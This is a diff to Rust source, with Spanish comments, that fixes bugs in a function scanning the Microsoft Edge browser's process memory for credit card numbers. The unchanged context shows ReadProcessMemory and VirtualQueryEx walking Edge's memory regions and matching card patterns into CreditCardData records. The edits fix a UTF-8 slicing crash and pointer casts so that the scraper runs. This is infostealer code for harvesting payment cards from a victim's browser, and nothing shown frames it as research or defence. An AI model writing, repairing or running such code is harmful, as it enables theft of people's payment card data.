@@ -190,7 +190,9 @@ where
                         let has_text = sample.chars().filter(|c| c.is_alphanumeric()).count() > 10;
                         
                         if has_text && pages_in_region < 3 {
-                            log(&format!("        📄 Región legible - Sample: {:?}", &sample[..sample.len().min(60)]));
+                            // FIX: Usar .chars() para respetar límites UTF-8
+                            let safe_sample: String = sample.chars().take(60).collect();
+                            log(&format!("        📄 Región legible - Sample: {:?}", safe_sample));
                         }
                         
                         if let Some(card) = search_credit_card_pattern(&buffer[..bytes_read]) {
@@ -268,7 +270,7 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
             let mut mbi: MEMORY_BASIC_INFORMATION = mem::zeroed();
             let query_result = VirtualQueryEx(
                 edge.handle,
-                address as LPVOID,
+                address as *const _ as LPVOID,
                 &mut mbi as *mut MEMORY_BASIC_INFORMATION,
                 mem::size_of::<MEMORY_BASIC_INFORMATION>()
             );
@@ -306,7 +308,7 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
                     // ReadProcessMemory
                     let result = ReadProcessMemory(
                         edge.handle,
-                        region_addr as LPVOID,
+                        region_addr as *mut _ as LPVOID,
                         buffer.as_mut_ptr() as LPVOID,
                         CHUNK_SIZE,
                         &mut bytes_read as *mut usize
